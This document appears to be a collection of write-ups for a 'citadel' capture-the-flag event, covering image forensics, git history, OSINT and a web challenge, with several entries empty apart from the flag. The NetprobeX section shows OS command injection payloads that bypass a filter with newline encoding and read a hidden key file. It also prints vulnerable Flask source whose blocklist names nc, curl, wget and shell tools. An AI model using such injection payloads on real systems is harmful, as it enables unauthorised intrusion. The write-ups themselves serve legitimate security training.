# Omniscient Flag's Metadata

Author: Indrath

Category: Forensics

Difficulty: Easy

As you step into the second chamber, a figure manifests. Before you stands a forgotten deity, a dead god spoken of only in whispers. Known by countless names: “Apostle of Epilogue and Eternity”, “Lone Messiah” and many more lost to time.

They leave nothing but a single image, a relic carrying his final secret. Hidden within its layers lies the key to ascend to the next chamber.

## Solution:

- On opening the file attached in the challenge, it shows:
  
  <img width="640" height="1017" alt="image" src="https://github.com/user-attachments/assets/30ee5e21-3ab2-4af8-96a2-220206ddd7d7" />
  
- As the the question is about metadata, check EXIF metadata by running `exiftool challenge.jpg` in the terminal.
  ```sh
  Last login: Sat Oct  4 17:30:48 on console
  nehanandini@Nehas-MacBook-Air ~ % exiftool challenge.jpg
  zsh: command not found: exiftool
  ```
- This means that `exiftool` is not installed on the Mac.
- So install it first using `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"` to install homebrew first but since homebrew is already there, use `brew install exiftool` to install exiftool.
- Run `exiftool challenge.jpg` to check its metadata.
  ```sh
  mdls challenge.jpg
  _kMDItemDisplayNameWithExtensions  = "challenge.jpg"
  kMDItemAuthors                     = (
      "kdj had a habit of hiding images within images"
  )
  kMDItemBitsPerSample               = 24
  kMDItemColorSpace                  = "RGB"
  kMDItemContentCreationDate         = 2025-10-04 12:40:00 +0000
  kMDItemContentCreationDate_Ranking = 2025-10-04 00:00:00 +0000
  kMDItemContentModificationDate     = 2025-10-04 12:40:01 +0000
  kMDItemContentType                 = "public.jpeg"
  kMDItemContentTypeTree             = (
      "public.jpeg",
      "public.image",
      "public.data",
      "public.item",
      "public.content"
  )
  kMDItemDateAdded                   = 2025-10-04 12:40:00 +0000
  kMDItemDisplayName                 = "challenge.jpg"
  kMDItemDocumentIdentifier          = 0
  kMDItemFSContentChangeDate         = 2025-10-04 12:40:01 +0000
  kMDItemFSCreationDate              = 2025-10-04 12:40:00 +0000
  kMDItemFSCreatorCode               = ""
  kMDItemFSFinderFlags               = 0
  kMDItemFSHasCustomIcon             = (null)
  kMDItemFSInvisible                 = 0
  kMDItemFSIsExtensionHidden         = 0
  kMDItemFSIsStationery              = (null)
  kMDItemFSLabel                     = 0
  kMDItemFSName                      = "challenge.jpg"
  kMDItemFSNodeCount                 = (null)
  kMDItemFSOwnerGroupID              = 20
  kMDItemFSOwnerUserID               = 501
  kMDItemFSSize                      = 371263
  kMDItemFSTypeCode                  = ""
  kMDItemHasAlphaChannel             = 0
  kMDItemInterestingDate_Ranking     = 2025-10-04 00:00:00 +0000
  kMDItemKind                        = "JPEG image"
  kMDItemLastUsedDate                = 2025-10-04 12:42:39 +0000
  kMDItemLastUsedDate_Ranking        = 2025-10-04 00:00:00 +0000
  kMDItemLogicalSize                 = 371263
  kMDItemOrientation                 = 1
  kMDItemPhysicalSize                = 380928
  kMDItemPixelCount                  = 650880
  kMDItemPixelHeight                 = 1017
  kMDItemPixelWidth                  = 640
  kMDItemProfileName                 = "sRGB IEC61966-2.1"
  kMDItemUseCount                    = 8
  kMDItemUsedDates                   = (
      "2025-10-03 18:30:00 +0000"
  )
  kMDItemWhereFroms                  = (
      "https://citadel.cryptonitemit.in/files/2378893c721bd88ce6e99b644c4ef130/challenge.jpg?token=eyJ1c2VyX2lkIjoyMTUsInRlYW1faWQiOjY3LCJmaWxlX2lkIjo0NX0.aOEVfA.ITrIVbCALijLLz16Cv7L39lg5sM",
      "https://citadel.cryptonitemit.in/challenges"
  )
  ```
- The `mdls` output shows
  ```sh
  kMDItemAuthors = (
    "kdj had a habit of hiding images within images"
  )
  ```
- This hint is important to solve the challenge.
- It means that the image contains another image hidden within it.
- Three techniques that causes the above scenario exist:
  - Steganography which means hiding an image inside another
  - Double file meaning an image appended after the JPEG end
  - LSB (Least Significant Bit) steganography
- First check if theres an appended data after the JPEG end.
- For that, use `xxd challenge.jpg | tail -20`.
   ```sh
  nehanandini@Nehas-MacBook-Air ~ % xxd challenge.jpg | tail -20
  xxd: challenge.jpg: No such file or directory
  ```
- It shows the above as the directory has to be Downloads where the challenge.jpg is located.
- Run 
  ```sh
  cd ~/Downloads
  grep -a "CTF{" challenge.jpg
  ```
- The above changes the directory to Downloads and then checks if theres data after the JPEG end marker.
- The output would be
  ```sh
  cd ~/Downloads
  nehanandini@Nehas-MacBook-Air Downloads % grep -a "CTF{" challenge.jpg
  nehanandini@Nehas-MacBook-Air Downloads % xxd challenge.jpg | tail -20
  0005a900: 4d53 1405 09d8 8e24 f2e2 2bf9 6ac9 ee87  MS.....$..+.j...
  0005a910: 996a effc cea9 8aad 4899 f5a8 a072 8368  .j......H....r.h
  0005a920: 62a1 555b 3cc7 54ad 79f1 0df7 d82e 9b1f  b.U[<.T.y.......
  0005a930: 90f7 dd06 48b4 ad0f 64ea da83 18e7 5c9a  ....H...d.....\.
  0005a940: a6d3 2654 5555 96e5 d243 ebaa 723d e6b4  ..&TUU...C..r=..
  0005a950: 38e7 b0ea b765 719e 6f96 579a e02e 3dd7  8....eq.o.W...=.
  0005a960: 7bc1 e6ac b76e 8a6d 86e2 a2d7 b3a5 f7e5  {....n.m........
  0005a970: d263 9ce7 5fcf b6d0 a1ff 8d77 f9dc e5cd  .c.._......w....
  0005a980: 256f cf80 6f69 06f9 b6df 78ff c9e6 4ef7  %o..oi....x...N.
  0005a990: 85d7 981e 0f97 d105 31a5 f5d0 fefc 9f1c  ........1.......
  0005a9a0: 2e59 6d8e d5c4 5740 148e eb75 7bb4 12d9  .Ym...W@...u{...
  0005a9b0: 1bfd 5b3b 77a8 4188 70db 41e6 adc7 8e2b  ..[;w.A.p.A....+
  0005a9c0: 633d 033e a7c6 b04e 1978 b960 72fd b77a  c=.>...N.x.`r..z
  0005a9d0: db3d f4a0 1b81 e2b5 7c1d 5718 b8f0 6de6  .=......|.W...m.
  0005a9e0: 635b e6b7 2055 fd5e 87c8 6fcd 02d7 f78b  c[.. U.^..o.....
  0005a9f0: 7642 6806 0c0b eeb7 55d8 e082 a9ed f99f  vBh.....U.......
  0005aa00: 78be 97ed 0602 af37 821f 96ae 56fa 422e  x......7....V.B.
  0005aa10: 7291 e71f 573b fd71 cef5 6c0c 1dd6 7f65  r...W;.q..l....e
  0005aa20: d7eb e999 cfe5 6246 efff 035a 0819 3f6d  ......bF...Z..?m
  0005aa30: 3040 cf00 0000 0049 454e 44ae 4260 82    0@.....IEND.B`.
  ```
- The `xxd` output ends with `IEND` and `B` which is a PNG file signature.
- There exist a PNG image hidden after the JPEG data.
- Use Python to extract data after the JPEG marker.
  ```sh
  cd ~/Downloads
  python3 -c "
  data = open('challenge.jpg', 'rb').read()
  jpeg_end = data.find(b'\xff\xd9')
  if jpeg_end != -1:
      hidden_data = data[jpeg_end + 2:]
      open('hidden.png', 'wb').write(hidden_data)
      print(f'Extracted {len(hidden_data)} bytes to hidden.png')
      print('PNG file should contain the flag!')
  "
  ```
- The following is the output.
  ```sh
  Extracted 310775 bytes to hidden.png
  PNG file should contain the flag!
  ```
- `hidden.png` has been extracted from the JPEG file.
- Use `open hidden.png` to view the flag.

  <img width="514" height="456" alt="image" src="https://github.com/user-attachments/assets/320fb246-4ce6-4c4b-802f-1df30dcf2380" />

  The exctracted file might not be a valid PNG or it might be corrupted.
- Check what has actually been exctracted by running 
  ```sh
  cd ~/Downloads
  file hidden.png
  xxd hidden.png | head -3
  strings hidden.png | grep -E "CTF{|flag{|citadel{|FLAG{"
  xxd hidden.png | tail -10
  ```
- Verification of the file type and structure is done by `file hidden.png`.
- `xxd hidden.png | head -3` checks if the file has a valid PNG header.
- `strings hidden.png | grep -E "CTF{|flag{|citadel{|FLAG{"` looks for any flag formats existing.
- The end of the file is checked by `xxd hidden.png | tail -10`.
- The terminal steps with commands and output are mentioned below.
  ```sh
  nehanandini@Nehas-MacBook-Air Downloads % cd ~/Downloads
  nehanandini@Nehas-MacBook-Air Downloads % file hidden.png
  hidden.png: data
  nehanandini@Nehas-MacBook-Air Downloads % xxd hidden.png | head -3
  00000000: 0651 4fda d46d 6a00 968a 1e9d b680 1b45  .QO..mj........E
  00000010: 3b6d 37ca f6a0 028a 3caf 6a3c af6a 003e  ;m7.....<.j<.j.>
  00000020: 4aaf 3cbb 76cd ff00 3c91 be4f ef55 8d94  J.<.v...<..O.U..
  nehanandini@Nehas-MacBook-Air Downloads % strings hidden.png | grep -E "CTF{|flag{|citadel{|FLAG{"
  nehanandini@Nehas-MacBook-Air Downloads % xxd hidden.png | tail -10
  0004bd60: 148e eb75 7bb4 12d9 1bfd 5b3b 77a8 4188  ...u{.....[;w.A.
  0004bd70: 70db 41e6 adc7 8e2b 633d 033e a7c6 b04e  p.A....+c=.>...N
  0004bd80: 1978 b960 72fd b77a db3d f4a0 1b81 e2b5  .x.`r..z.=......
  0004bd90: 7c1d 5718 b8f0 6de6 635b e6b7 2055 fd5e  |.W...m.c[.. U.^
  0004bda0: 87c8 6fcd 02d7 f78b 7642 6806 0c0b eeb7  ..o.....vBh.....
  0004bdb0: 55d8 e082 a9ed f99f 78be 97ed 0602 af37  U.......x......7
  0004bdc0: 821f 96ae 56fa 422e 7291 e71f 573b fd71  ....V.B.r...W;.q
  0004bdd0: cef5 6c0c 1dd6 7f65 d7eb e999 cfe5 6246  ..l....e......bF
  0004bde0: efff 035a 0819 3f6d 3040 cf00 0000 0049  ...Z..?m0@.....I
  0004bdf0: 454e 44ae 4260 82                        END.B`.
  ```
- The issue is clear now. The extracted `hidden.png` doesn't have a proper PNG header (`89 50 4E 47`) but it does have the PNG end marker (`IEND`) at the end.
- So the PNG data starts somewhere before it was extracted. The following find actual PNG header in the original file.
  ```sh
  python3 -c "
  data = open('challenge.jpg', 'rb').read()
  png_start = data.find(b'\x89PNG\r\n\x1a\n')
  print(f'PNG header found at position: {png_start}')
  if png_start != -1:
      png_data = data[png_start:]
      open('correct.png', 'wb').write(png_data)
      print(f'Extracted {len(png_data)} bytes as correct.png')
      import subprocess
      result = subprocess.run(['file', 'correct.png'], capture_output=True, text=True)
      print(f'File type: {result.stdout}')
  else:
      print('No PNG header found in the file')
  "
  ```
- The above searchwa for the actual PNG header in `challenge.jpg`, extracts the PNG properly if found, saves it as `correct.png` and then checks if it's a valid PNG file.
- The output given by the terminal for the above is:
  ```sh
  PNG header found at position: 87530
  Extracted 283733 bytes as correct.png
  File type: correct.png: PNG image data, 640 x 613, 8-bit/color RGB, non-interlaced
  ```
- It means a valid PNG file was found and exctrated.
- Run `open correct.png` to view the flag.
- This leads to:
  
  <img width="640" height="613" alt="image" src="https://github.com/user-attachments/assets/7cd596e6-d8c9-4b4e-b1b8-d851f9963aa2" />

## Flag: 

```
citadel{th1s_ch4ll3ng3_1s_f0r_th4t_0n3_ex1ft00l_4nd_b1nw4lk_enthus14st}
```

### References:

- 

### Notes:

-



# Randomly Accessed Memories

Author: pseudonymous

Category: Misc

Difficulty: Easy


clone it, pull it, reset it, stage it,
commit, push it, fork, rebase it,
merge it, branch it, tag it, log it,
add it, stash it, diff, untrack it.

On your ascent to this floor, you hear these fragments being played back 

```sh
You look around and discover a chamber containing a vast archive of Daft Punk’s music, intertwined with cryptic commits left behind by other musicians. They seem ordinary at first glance, but not everything in the history is what it seems.
```

Challenge: https://github.com/evilcryptonite/daft-punk-archive

## Solution:

- `git clone https://github.com/evilcryptonite/daft-punk-archive` to clone the repository as mentioned in the challenge.
- `cd daft-punk-archive` to change the current working directory to it.
- `not eveyrthing in the history is what it seems` implies that something is hidden so check the past commits for the hidden information.
- `git log --oneline` shows all the previous commits.
  ```sh
  nehanandini@Nehas-MacBook-Air daft-punk-archive % git log --oneline
  168947c (HEAD -> main, origin/main, origin/HEAD) Routine update #300
  778eece Routine update #299
  6246c98 Routine update #298
  726a3bf Routine update #297
  f15c7e5 Routine update #296
  589a485 Routine update #295
  5bbbf2e Routine update #294
  421e1ab Routine update #293
  6cf2ca4 Routine update #292
  7d22c4b Routine update #291
  804adf1 Routine update #290
  b788a15 Routine update #289
  8f06b9a Routine update #288
  f096064 Routine update #287
  b5f3b1c Routine update #286
  1cffc9e Routine update #285
  2e3d91d Routine update #284
  e252558 Routine update #283
  451a2f9 Routine update #282
  7e103ab Routine update #281
  8d1aac6 Routine update #280
  18f8435 Remove secret chunk 3 file (history-only)
  79af115 Add secret chunk 3 (base64) [commit 279]
  168947c (HEAD -> main, origin/main, origin/HEAD) Routine update #300
  778eece Routine update #299
  6246c98 Routine update #298
  726a3bf Routine update #297
  f15c7e5 Routine update #296
  589a485 Routine update #295
  5bbbf2e Routine update #294
  421e1ab Routine update #293
  6cf2ca4 Routine update #292
  7d22c4b Routine update #291
  804adf1 Routine update #290
  b788a15 Routine update #289
  8f06b9a Routine update #288
  f096064 Routine update #287
  b5f3b1c Routine update #286
  1cffc9e Routine update #285
  2e3d91d Routine update #284
  e252558 Routine update #283
  451a2f9 Routine update #282
  7e103ab Routine update #281
  8d1aac6 Routine update #280
  18f8435 Remove secret chunk 3 file (history-only)
  79af115 Add secret chunk 3 (base64) [commit 279]
  df7c6e6 Routine update #278
  c2bc017 Routine update #277
  f5fe582 Routine update #276
  e50c0ac Routine update #275
  2efae35 Routine update #274
  7349c47 Routine update #273
  aa62762 Routine update #272
  f5ddbea Routine update #271
  2120217 Routine update #270
  31820c9 Routine update #269
  92fa8cf Routine update #268
  cfd3f85 Routine update #267
  c445bce Routine update #266
  ef72333 Routine update #265
  005278a Routine update #264
  17ae81d Routine update #263
  4d1f40b Routine update #262
  0f389d4 Routine update #261
  8fb5ba9 Routine update #260
  bcf8626 Routine update #259
  97e570d Routine update #258
  4df46ff Routine update #257
  f3fa389 Routine update #256
  :
  ```
- The above shows these 2 commits:
  - `18f8435 Remove secret chunk 3 file (history-only)`
  - `79af115 Add secret chunk 3 (base64) [commit 279]`
  This means a file containing the secret chunk 3 was added in commit `79af115` and then removed in `18f8435` but it still exists in the Git history.
- `git log --oneline --grep="secret chunk"` to check if multiple parts that need to be combined exist.
  ```sh
  nehanandini@Nehas-MacBook-Air daft-punk-archive % git log --oneline | grep -i secret
  18f8435 Remove secret chunk 3 file (history-only)
  79af115 Add secret chunk 3 (base64) [commit 279]
  977d650 Remove secret chunk 2 file (history-only)
  cc8b79a Add secret chunk 2 (base64) [commit 122]
  86fdefa Remove secret chunk 1 file (history-only)
  50474f3 Add secret chunk 1 (base64) [commit 56]
  ```
  3 secret chunks that need to be combined to get the flag were added and removed.
- `git show 50474f3`, `git show cc8b79a` and `git show 79af115` exctracts each of the 3 chunks.
  ```sh
  nehanandini@Nehas-MacBook-Air daft-punk-archive % git show 50474f3
  commit 50474f316ba2ff644b546437a032971874f43ecf
  Author: Thomas Bangalter <thomas@daftpunk.com>
  Date:   Fri Apr 4 11:06:26 2025 +0530

    Add secret chunk 1 (base64) [commit 56]

  diff --git a/secret_chunk_1.b64 b/secret_chunk_1.b64
  new file mode 100644
  index 0000000..815a643
  --- /dev/null
  +++ b/secret_chunk_1.b64
  @@ -0,0 +1,2 @@
  +# secret piece 1
  +Y2l0YWRlbHt3M180cjM=
  nehanandini@Nehas-MacBook-Air daft-punk-archive % git show cc8b79a
  commit cc8b79a83c2ef5997c728d1037368042af85214f
  Author: Abel Tesfaya <abel@weeknd.com>
  Date:   Sat May 10 07:03:11 2025 +0530

    Add secret chunk 2 (base64) [commit 122]
  diff --git a/secret_chunk_2.b64 b/secret_chunk_2.b64
  new file mode 100644
  index 0000000..6199d9c
  --- /dev/null
  +++ b/secret_chunk_2.b64
  @@ -0,0 +1,2 @@
  +# secret piece 2
  +X3VwXzRsbF9uMXQzXw==
  nehanandini@Nehas-MacBook-Air daft-punk-archive % git show 79af115
  commit 79af115d8b2cef0f3110f21f5475e1b5bea1a0af
  Author: Julian Casablacasn <julian@thestrokes.com>
  Date:   Wed Apr 16 20:18:52 2025 +0530

    Add secret chunk 3 (base64) [commit 279]
  diff --git a/secret_chunk_3.b64 b/secret_chunk_3.b64
  new file mode 100644
  index 0000000..46cced2
  --- /dev/null
  +++ b/secret_chunk_3.b64
  @@ -0,0 +1,2 @@
  +# secret piece 3
  +dDBfZzF0X2x1Y2t5fQ==
  nehanandini@Nehas-MacBook-Air daft-punk-archive %
  ```
- The 3 are base64 chunks and need to be decoded and combined to give the flag.
- `echo "Y2l0YWRlbHt3M180cjM=" | base64 -d`, `echo "X3VwXzRsbF9uMXQzXw==" | base64 -d` and `echo "dDBfZzF0X2x1Y2t5fQ==" | base64 -d` gives the parts of the flag.
  ```sh
  nehanandini@Nehas-MacBook-Air daft-punk-archive % echo "Y2l0YWRlbHt3M180cjM=" | base64 -d
  citadel{w3_4r3%
  nehanandini@Nehas-MacBook-Air daft-punk-archive % echo "X3VwXzRsbF9uMXQzXw==" | base64 -d
  _up_4ll_n1t3_%
  nehanandini@Nehas-MacBook-Air daft-punk-archive % echo "dDBfZzF0X2x1Y2t5fQ==" | base64 -d
  t0_g1t_lucky}%   
  ```
- Combine the 3 parts to get the full flag.

## Flag: 

```
citadel{w3_4r3_up_4ll_n1t3_t0_g1t_lucky}
```

### References:

- 

### Notes:

- 



# Coco Conjecture

Author: Indrath

Category: Misc

Difficulty: Easy

The door to the next floor is guarded by a figure who calls herself "the dragon CEO". She does not speak of mercy or choice. only of order and efficiency.

To enter the next chamber, you must complete the task presented by her. Complete it exactly as instructed, achieving operational efficiency by her standards, and the path forward will open.

Connection: `nc chall_citadel.cryptonitemit.in 61234`

## Solution:

- The challenge is the Collatz Conjecture challenge, as shown in Coco_Conjecture.pdf .
- As mentioned in helped.md, first install `pwntools` by using the command `pip install pwntools`.
- 

## Flag: 

```
citadel{k1ryu_c0c0_h4s_4_g0_4t_4n_uns0lv3d_m4th3m4t1cs_pr0bl3m}
```

### References:

- none

### Notes:

- 



# The Sound of Music

Author: teayah

Category: OSINT

Difficulty: Medium

🗼OSINT pt2: `citadweller` had a newfound interest in tracking the music they last listened to and posting ratings of new albums on various online platforms.

The flag is hidden in these digital footprints across music platforms and split into three segments. You will need to find all three to uncover the complete code and move on to the next floor.

## Solution:

- First, the flag's part ii was found on https://rateyourmusic.com/~citadweller.
  `🗼 OSINT pt.2, flag part ii : _n_started_shar1ng_st0r1es`
- The above website also has another link http://tinyurl.com/citadweller which redirects to spotify, https://open.spotify.com/user/317w4n4m2a4btks6hrqomyo3wpqu. Spotify contains the         flag's part iii.
  `flag part iii: _n_then_they_were_n0where_t0_be_f0und}`
- `https://www.last.fm/user/citadweller` gives the part i.
  `🗼OSINT pt.2, flag part i: citadel{c0mputers_st0pped_exchang1ng_1nf0rmat10n`
- Combine all the 3 parts to get the full part.

## Flag: 

```
citadel{c0mputers_st0pped_exchang1ng_1nf0rmat10n_n_started_shar1ng_st0r1es_n_then_they_were_n0where_t0_be_f0und}
```

### References:

- 

### Notes:

- 



# AetherCorp NetprobeX

Author: dunruh

Category: Web

Difficulty: medium

You step into a simulation of the past, entering the ruins of AetherCorp, the most ambitious corporation in history, and their creation, NetProbeX, once the most advanced networking tool the world had ever seen. The floor reconstructs the events that led to humanity’s downfall.

Your task is to find the hidden backdoor in NetProbeX, the flaw that triggered the collapse. By uncovering it, you can reverse the damage and retrieve the passcode to advance to the next floor.

Engineers left faint traces in the logs — small, odd markers where separators once sat. Read these traces as if they divide commands.

Challenge: http://chall_citadel.cryptonitemit.in:32772/

## Solution:

- `127.0.0.1; id` to search for files that contain "flag".
- The output is given below.
  ```sh
  Executing: ping -c 4 127.0.0.1; id

  Error: Malicious character ';' detected.
  ```
  This means that the semicolon (`;`) was blocked.
- `127.0.0.1%0aid` to try if newline works.
- This results in the following.
  ```sh
  Executing: ping -c 4 127.0.0.1%0aid

  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms
  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms
  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.040 ms

  --- 127.0.0.1 ping statistics ---
  4 packets transmitted, 4 received, 0% packet loss, time 3067ms
  rtt min/avg/max/mdev = 0.015/0.033/0.040/0.010 ms
  uid=100(ctf) gid=101(ctf) groups=101(ctf)
  ```
  It can be concluded that '%0a` works fine.
- `127.0.0.1%0a find / -type f -name "*flag*" 2>/dev/null` to search for files that contain the term "flag" within them.
- All system files and not challenge files are shown.
- `127.0.0.1%0a grep -r "CTF{" / 2>/dev/null` is used for more precision.
- The above results in an error as `{` is blocked.
  ```sh
  Executing: ping -c 4 127.0.0.1%0a grep -r "CTF{" / 2>/dev/null

  Error: Malicious character '{' detected.
  ```
- `127.0.0.1%0a ls -la` to check the current directory contents.
- The command leads to the following.
  ```sh
  Executing: ping -c 4 127.0.0.1%0a ls -la

  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms
  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.044 ms
  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.039 ms
  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.036 ms

  --- 127.0.0.1 ping statistics ---
  4 packets transmitted, 4 received, 0% packet loss, time 3052ms
  rtt min/avg/max/mdev = 0.016/0.033/0.044/0.010 ms
  total 24
  drwxr-xr-x 1 root root 4096 Oct  4 17:26 .
  drwxr-xr-x 1 root root 4096 Oct  4 17:27 ..
  -rwxr-xr-x 1 root root 2300 Oct  4 17:25 app.py
  -rwxr-xr-x 1 root root  290 Oct  4 07:38 mission_briefing.txt
  -rwxr-xr-x 1 root root   14 Oct  4 07:38 requirements.txt
  drwxr-xr-x 2 root root 4096 Oct  4 07:38 templates
  ```
  `mission_briefing.txt` seems suspicious.
- `127.0.0.1%0a cat mission_briefing.txt` to read the file's contents.
- The above command doesn't work as `cat` has been blocked too.
  ```sh
  Executing: ping -c 4 127.0.0.1%0a cat mission_briefing.txt

  Error: Malicious command 'cat' detected.
  ```
- `127.0.0.1%0a head mission_briefing.txt` to read the file using an alternate method.
- The above works and gives the following.
  ```sh
  Executing: ping -c 4 127.0.0.1%0a head mission_briefing.txt

  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.012 ms
  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.038 ms
  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.037 ms
  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.037 ms

  --- 127.0.0.1 ping statistics ---
  4 packets transmitted, 4 received, 0% packet loss, time 3062ms
  rtt min/avg/max/mdev = 0.012/0.031/0.038/0.011 ms
  ================= OPERATION: SILENT ECHO =================
                  CLASSIFICATION: BLACK ICE

  Agent, your objective is to recover the Blacksite Key.
  Our intel confirms it’s hidden deep within the AetherCorp network.

  =========================================================
  ```
  This shows that this file doesn't contain the flag.
- `127.0.0.1%0a head -100 app.py` to see if it might reveal the flag.
- The above tells whats allowed and blocked.
  ```sh
  Executing: ping -c 4 127.0.0.1%0a head -100 app.py

  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms
  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.030 ms
  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.036 ms

  --- 127.0.0.1 ping statistics ---
  4 packets transmitted, 4 received, 0% packet loss, time 3050ms
  rtt min/avg/max/mdev = 0.013/0.029/0.039/0.010 ms
  import subprocess
  import urllib.parse
  import re
  from flask import Flask, request, jsonify, render_template

  app = Flask(__name__)

  BLACKLISTED_WORDS = [
      'sh', 'bash', 'zsh', 'python', 'perl', 'php', 'ruby', 'nc', 'netcat',
      'wget', 'curl', 'nmap', 'ssh', 'ftp', 'rm', 'mv', 'cp', 'mkdir',
      'touch', 'chmod', 'chown', 'reboot', 'shutdown', 'halt', 'poweroff',
      'apt', 'yum', 'dnf', 'pacman', 'pip', 'sudo', 'su', 'passwd',
      'useradd', 'groupadd','grep','cat', 'cd'
  ]

  BLACKLISTED_CHARS = [';', '|', '`', '$', '(', ')', '{', '}', '&', '\r', '\t']

  WHITELIST = ['ls','*','/',]
  def waf_filter(target_host):
      for char in BLACKLISTED_CHARS:
          if char in target_host:
              return False, f"Error: Malicious character '{char}' detected."
      all_words = re.split(r'[\s\n\r\t]+', target_host)
      for word in all_words:
          word = word.strip()
          if word and word in BLACKLISTED_WORDS:
               return False, f"Error: Malicious command '{word}' detected."
      if '../' in target_host:
          return False, "Error: Directory traversal detected."
      return True, None

  @app.route('/')
  def serve_index():
      return render_template('index.html')

  @app.route('/ping', methods=['POST'])
  def execute_ping():
      data = request.get_json()
      target_raw = data.get('target', '')
      if not target_raw:
          return jsonify({'error': 'Target host cannot be empty.'}), 400
      target = urllib.parse.unquote(target_raw)
      is_safe, error_message = waf_filter(target)
      if not is_safe:
          return jsonify({'output': error_message, 'is_error': True, 'raw_target': target_raw}), 400
      command = f"ping -c 4 -W 3 {target}"
      try:
          result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10, cwd="./")
          output = result.stdout + result.stderr
          return jsonify({'output': output, 'is_error': bool(result.stderr), 'raw_target': target_raw})
      except subprocess.TimeoutExpired:
          return jsonify({'output': 'Error: The command timed out.', 'is_error': True, 'raw_target': target_raw}), 504
      except Exception as e:
          return jsonify({'output': f'An unexpected server error occurred: {e}', 'is_error': True, 'raw_target': target_raw}), 500

  if __name__ == '__main__':
      app.run(host='0.0.0.0', port=5000)
  ```
  `grep`, `|` are blocked but `head`, `tail`, `more` and `less` are allowed.
- `127.0.0.1%0a ls -la templates` to check the template directories. It gets executed but no important information.
- `127.0.0.1%0a env` to check the environmenta variabled. This too is executed but results in no flag.
- Hint for Aethercorp NetProbeX:
  Some instructions can be used to search through the depths of the system and find the key
- `127.0.0.1%0a find / -type f -name "*key*" 2>/dev/null` to check for files with "key" in name as mentioned in the hint.
- The above command gives the following.
  ```sh
  Executing: ping -c 4 127.0.0.1%0a find / -type f -name "*key*" 2>/dev/null

  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.040 ms
  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.034 ms
  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.039 ms

  --- 127.0.0.1 ping statistics ---
  4 packets transmitted, 4 received, 0% packet loss, time 3075ms
  rtt min/avg/max/mdev = 0.019/0.033/0.040/0.008 ms
  /usr/local/lib/python3.11/site-packages/setuptools/monkey.py
  /usr/local/lib/python3.11/curses/has_key.py
  /usr/local/lib/python3.11/keyword.py
  /usr/local/lib/python3.11/lib2to3/fixes/fix_has_key.py
  /usr/local/lib/python3.11/idlelib/config-keys.def
  /usr/local/lib/python3.11/idlelib/config_key.py
  /usr/bin/lesskey
  /usr/share/keyrings/debian-archive-keyring.pgp
  /usr/share/keyrings/debian-archive-removed-keys.pgp
  /usr/lib/x86_64-linux-gnu/security/pam_keyinit.so
  /proc/sys/kernel/keys/maxkeys
  /proc/sys/kernel/keys/persistent_keyring_expiry
  /proc/sys/kernel/keys/root_maxkeys
  /proc/sys/net/ipv4/tcp_fastopen_key
  /proc/keys
  /proc/key-users
  /proc/1/task/1/attr/keycreate
  /proc/1/attr/keycreate
  /proc/2054/task/2054/attr/keycreate
  /proc/2054/attr/keycreate
  /proc/2183/task/2183/attr/keycreate
  /proc/2183/attr/keycreate
  /proc/2185/task/2185/attr/keycreate
  /proc/2185/attr/keycreate
  /var/lib/dpkg/info/debian-archive-keyring.postinst
  /var/lib/dpkg/info/debian-archive-keyring.md5sums
  /var/lib/dpkg/info/debian-archive-keyring.list
  /var/lib/dpkg/info/debian-archive-keyring.prerm
  /var/lib/dpkg/info/debian-archive-keyring.postrm
  /var/lib/dpkg/info/debian-archive-keyring.preinst
  /var/lib/dpkg/info/debian-archive-keyring.conffiles
  /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
  /sys/kernel/btf/hyperv_keyboard
  /sys/devices/0006:045E:0621.0001/input/input1/capabilities/key
  /sys/devices/LNXSYSTM:00/LNXSYBUS:00/ACPI0004:00/VMBUS:00/d34b2567-b9b6-42b9-8778-0a4ec0b955bf/serio0/input/input0/capabilities/key
  /sys/module/libnvdimm/parameters/key_revalidate
  ```
  `/var/lib/aethercorp/archive/.secrets/blacksite_key.dat` seems to contains the flag.
- `127.0.0.1%0a head /var/lib/aethercorp/archive/.secrets/blacksite_key.dat` to read the file. It gets executed and shows the flag.
  
## Flag: 

```
citadel{bl4ck51t3_4cc3ss_gr4nt3d}
```

### References:

- 

### Notes:

- 



# Feels Like We Only Go Backwards

Author: shady

Category: Reverse Engineering

Difficulty: Medium

After finding the backdoor and making your way to the next floor, you step into a chamber awash with shifting colors and swirling echoes, a concert frozen in time. Kevin Parker stands at the center, his riffs bending reality around him. To ascend, you’ll need to join the session on his terms: push your voice further than comfort, align yourself with the number he hides in the haze, and piece together the melody concealed within layers of reverb. Only then will the music open the way upward.

## Solution:

- 

## Flag: 

```
citadel{f0r_0n3_m0r3_h0ur_1_c4n_r4g3}
```

### References:

- 

### Notes:

- 



# Database Incursion

Author: BlueKnight2345

Category: Web

Difficulty: Medium

